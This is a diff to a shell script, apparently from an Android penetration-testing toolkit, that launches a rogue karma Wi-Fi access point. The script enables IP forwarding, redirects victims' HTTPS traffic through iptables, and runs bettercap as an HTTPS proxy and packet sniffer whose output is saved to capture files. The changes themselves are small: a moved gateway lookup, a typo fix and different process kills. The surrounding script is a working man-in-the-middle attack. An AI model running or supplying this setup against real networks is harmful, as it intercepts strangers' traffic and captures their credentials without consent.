@@ -3,8 +3,7 @@ upstream=wlan0
 phy=wlan1
 conf=/sdcard/nh_files/configs/hostapd-karma.conf
 hostapd=/usr/lib/mana-toolkit/hostapd
-
-#ifconfig wlan1 up
+GATEWAY=$(/system/bin/getprop net.dns1)  # CHANGE THIS IF GATEAY IS NOT SAME AS DNS
 
 echo '1' > /proc/sys/net/ipv4/ip_forward
 rfkill unblock wlan
@@ -53,21 +52,17 @@ iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 443 -j REDIRECT 
 # Create save folder for bettercap, get gateway IP and current time
 mkdir -p /captures/bettercap
 TIME=$(date +"%m-%d-%y-%H%M%S")
-GATEWAY=$(/system/bin/getprop net.dns1)  # WE NEED BETTER WAY TO GET GATEWAY
 
 # Start bettercap proxy
-echo "Staring bettercap..."
+echo "Starting bettercap..."
 echo "Saving output files to /captures/bettercap/sniffed-$TIME"
-echo "bettercap --proxy --proxy-https --no-spoofing --no-discovery -G $GATEWAY -I $phy -L --sniffer-pcap=/captures/bettercap/sniffed-$TIME.pcap -O /captures/bettercap/sniffed-$TIME -P '*'"
 bettercap --no-discovery --no-spoofing --proxy --proxy-https -G $GATEWAY -I $phy -L --sniffer-pcap=/captures/bettercap/sniffed-$TIME.pcap -O "/captures/bettercap/sniffed-${TIME}" -P '*' -X
 
 echo "Hit enter to kill me"
 read
 pkill dhcpd
-pkill sslstrip
-pkill sslsplit
 pkill hostapd
-pkill python
+pkill bettercap
 ## Restore
 #iptables-restore < /tmp/rules.txt
 #rm /tmp/rules.txt
